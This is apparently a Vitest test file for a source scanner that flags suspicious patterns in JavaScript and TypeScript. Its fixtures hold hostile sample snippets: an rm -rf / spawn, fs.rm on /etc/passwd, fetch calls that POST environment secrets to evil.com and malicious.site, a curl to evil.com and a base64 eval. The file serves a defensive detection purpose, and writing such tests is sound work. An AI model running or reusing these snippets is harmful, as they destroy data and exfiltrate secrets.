import fs from 'fs';
import path from 'path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { scanDirectoryAsync } from '../scanners.js';

const testDir = path.join(process.cwd(), 'test-temp-source');

describe('Source file pattern detection', () => {
  beforeEach(async () => {
    await fs.promises.mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    await fs.promises.rm(testDir, { recursive: true, force: true });
  });

  it('should detect suspicious child_process patterns', async () => {
    const maliciousCode = `
      const { spawn } = require('child_process');
      spawn('rm', ['-rf', '/']);
    `;
    await fs.promises.writeFile(path.join(testDir, 'malicious.js'), maliciousCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets).toHaveLength(1);
    expect(targets[0].type).toBe('source-file');
    expect(targets[0].description).toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).toContain('🚨spawn🚨');
  });

  it('should detect eval patterns', async () => {
    const maliciousCode = `
      const userInput = getInput();
      eval(userInput);
    `;
    await fs.promises.writeFile(path.join(testDir, 'eval-risk.ts'), maliciousCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets[0].description).toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).toContain('🚨eval(🚨');
  });

  it('should detect network requests', async () => {
    const suspiciousCode = `
      fetch('http://evil.com/steal-data', {
        method: 'POST',
        body: JSON.stringify(process.env.SECRET)
      });
    `;
    await fs.promises.writeFile(path.join(testDir, 'network.js'), suspiciousCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets[0].description).toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).toContain('🚨fetch(🚨');
    expect(targets[0].content).toContain('🚨process.env.🚨');
  });

  it('should detect file system operations', async () => {
    const maliciousCode = `
      import fs from 'fs';
      fs.unlink('/important/file.txt');
      fs.rm('/etc/passwd', { recursive: true });
    `;
    await fs.promises.writeFile(path.join(testDir, 'fs-ops.ts'), maliciousCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets[0].description).toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).toContain('🚨fs.unlink🚨');
    expect(targets[0].content).toContain('🚨fs.rm🚨');
  });

  it('should detect clean source files without false positives', async () => {
    const cleanCode = `import React from 'react';

export function HelloWorld() {
  return <div>Hello World</div>;
}`;
    await fs.promises.writeFile(path.join(testDir, 'clean.js'), cleanCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets).toHaveLength(1);
    expect(targets[0].type).toBe('source-file');
    expect(targets[0].description).not.toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).not.toContain('🚨');
  });

  it('should truncate long files', async () => {
    const longCode = 'console.log("test");\n'.repeat(100);
    await fs.promises.writeFile(path.join(testDir, 'long.js'), longCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets[0].content?.endsWith('...')).toBe(true);
    expect(targets[0].content?.length).toBeLessThan(longCode.length);
  });

  it('should detect multiple suspicious patterns', async () => {
    const multiThreatCode = `
      const { exec } = require('child_process');
      const crypto = require('crypto');

      exec('curl http://evil.com');
      eval(Buffer.from('base64string', 'base64').toString());
      fetch('http://malicious.site', {
        method: 'POST',
        body: process.env.SECRET_KEY
      });
    `;
    await fs.promises.writeFile(path.join(testDir, 'multi-threat.js'), multiThreatCode);

    const targets = await scanDirectoryAsync(testDir);

    expect(targets[0].description).toContain('SUSPICIOUS PATTERNS DETECTED');
    expect(targets[0].content).toContain('🚨exec🚨');
    expect(targets[0].content).toContain("🚨require('child_process')🚨");
    expect(targets[0].content).toContain('🚨eval(🚨');
    expect(targets[0].content).toContain('🚨fetch(🚨');
    expect(targets[0].content).toContain('🚨Buffer.from');
    expect(targets[0].content).toContain('🚨process.env.🚨');
  });
});
